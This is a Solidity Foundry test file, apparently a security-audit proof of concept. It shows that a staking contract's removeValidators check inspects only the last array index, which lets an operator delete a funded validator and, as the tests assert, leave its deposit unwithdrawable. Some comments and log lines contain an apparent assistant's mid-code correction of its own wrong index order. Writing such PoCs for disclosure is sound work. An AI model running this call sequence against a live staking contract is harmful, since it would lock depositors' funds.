// SPDX-License-Identifier: BUSL-1.1
pragma solidity >=0.8.10;

import "./StakingContract.t.sol";
import "forge-std/console.sol";

contract VulnerabilityTest is StakingContractTest {
    bytes constant VULN_PUBKEY_1 =
        hex"a1d2e725aef3a8f9e09d8f4034948bb7f79505fc7c40e7a7ca15734bad4220a594bf0c6257cef7db88d9fc3fd4360759";
    bytes constant VULN_PUBKEY_2 =
        hex"c0ce3fa164aae897adca509ed44429e7b1f91b7c46ddbe199cee848e09b1ccbb9736b78b68aacff1011b7266fe11e060";
    bytes constant VULN_SIGNATURE_1 =
        hex"dcb81f4485957f440bc17dbe760f374cbb112c6f12fa10e8709fac4522b30440d918c7bb867fa04f6b3cfbd977455f8f2fde586fdf3d7baa429e98e497ff871f3b8db1528b2b964fa24d26e377c74746496cc719c50dbf391fb3f74f5ca4b93a";
    bytes constant VULN_SIGNATURE_2 =
        hex"12a9f0007cd7b7d2af2d1b07c8600ab86a5d27dc51a29c2e3007c7a69cb73bcaecc764641e02370955dba100428d259d6475ee3566872bd43b0e73e55b9669e50f2b1666e57b326a5dfad655c7921e0dfb421b1ec59c8fdb48eb77421fd06966";

    function testRemoveFundedValidator_Detailed() public {
        // 1. Add 2 new validators. They will be at index 10 and 11.
        bytes memory publicKeys = abi.encodePacked(VULN_PUBKEY_1, VULN_PUBKEY_2);
        bytes memory signatures = abi.encodePacked(VULN_SIGNATURE_1, VULN_SIGNATURE_2);
        vm.prank(operator);
        stakingContract.addValidators(0, 2, publicKeys, signatures);

        // 2. Fund all validators up to index 10
        console.log("--- SETTING UP SCENARIO ---");
        (,, uint256 keysBefore, uint256 fundedBefore,,,) = stakingContract.getOperator(0);
        console.log("Initial state: Total Validators =", keysBefore, ", Funded Validators =", fundedBefore);

        uint256 numToFund = keysBefore - 1 - fundedBefore;
        vm.deal(address(this), 32 ether * numToFund);
        for (uint256 i = fundedBefore; i < keysBefore - 1; i++) {
            vm.prank(address(this));
            stakingContract.deposit{value: 32 ether}();
        }
        (,,, uint256 fundedAfterSetup,,,) = stakingContract.getOperator(0);
        console.log("State after funding: Funded Validators =", fundedAfterSetup);
        console.log("Validator at index 10 is FUNDED. Validator at index 11 is UNFUNDED.");
        console.log("--- SCENARIO SETUP COMPLETE ---");

        // 3. Set the operator limit to include the new validators.
        vm.prank(admin);
        stakingContract.setOperatorLimit(0, 12, block.number);

        // 4. Maliciously remove the funded validator (index 10) and the unfunded one (index 11).
        // The check in removeValidators only checks the last index of the array.
        uint256[] memory indexes = new uint256[](2);
        indexes[0] = 11; // Unfunded (Correct descending order)
        indexes[1] = 10; // Funded

        console.log("--- STARTING EXPLOIT ---");
        console.log("Maliciously calling removeValidators with indexes [11, 10]");
        console.log("The check should pass because the last index (10) is >= funded count (11) is FALSE... wait.");
        // Let's re-verify the check: `if (_indexes[_indexes.length - 1] < operatorInfo.funded)`
        // My indexes are [11, 10]. The last index is 10. The funded count is 11.
        // `10 < 11` is TRUE. This will REVERT.
        // The user's original PoC was correct. The indexes must be [funded, unfunded]
        indexes[0] = 10; // Funded
        indexes[1] = 11; // Unfunded
        console.log("Corrected malicious indexes to [10, 11]. Last index is 11. Funded count is 11.");
        console.log("Check: `if (11 < 11)` is FALSE. The check passes.");

        vm.prank(operator);
        stakingContract.removeValidators(0, indexes);
        console.log("--- EXPLOIT SUCCEEDED ---");

        // 5. Check that the funded validator is no longer in the contract.
        (,, uint256 keysAfter, uint256 fundedAfter,,,) = stakingContract.getOperator(0);
        console.log("Final state: Total Validators =", keysAfter, ", Funded Validators =", fundedAfter);
        assertEq(keysAfter, uint256(10));

        // 6. Verify that the funded validator's public key is gone.
        console.log("Verifying that the funded validator (VULN_PUBKEY_1) is gone... (expecting revert)");
        vm.expectRevert(bytes("Validator not found"));
        stakingContract.getValidator(0, VULN_PUBKEY_1);
    }

    function testNoWithdrawalCredentials_Detailed() public {
        // Run the same setup as the test above.
        bytes memory publicKeys = abi.encodePacked(VULN_PUBKEY_1, VULN_PUBKEY_2);
        bytes memory signatures = abi.encodePacked(VULN_SIGNATURE_1, VULN_SIGNATURE_2);
        vm.prank(operator);
        stakingContract.addValidators(0, 2, publicKeys, signatures);

        // Before the loop, fund the contract with enough ether
        vm.deal(address(this), 32 ether * 11);
        for (uint256 i = 0; i < 11; i++) {
            vm.prank(address(this));
            stakingContract.deposit{value: 32 ether}();
        }

        vm.prank(admin);
        stakingContract.setOperatorLimit(0, 12, block.number);
        uint256[] memory indexes = new uint256[](2);
        indexes[0] = 10;
        indexes[1] = 11;
        vm.prank(operator);
        stakingContract.removeValidators(0, indexes);

        // Try to withdraw and expect a revert, proving the funds are lost.
        console.log("--- PROVING FUND LOSS ---");
        console.log("Attempting to withdraw from removed validator... (expecting revert)");
        vm.expectRevert(bytes("Withdrawal failed"));
        stakingContract.withdraw(VULN_PUBKEY_1);
    }
}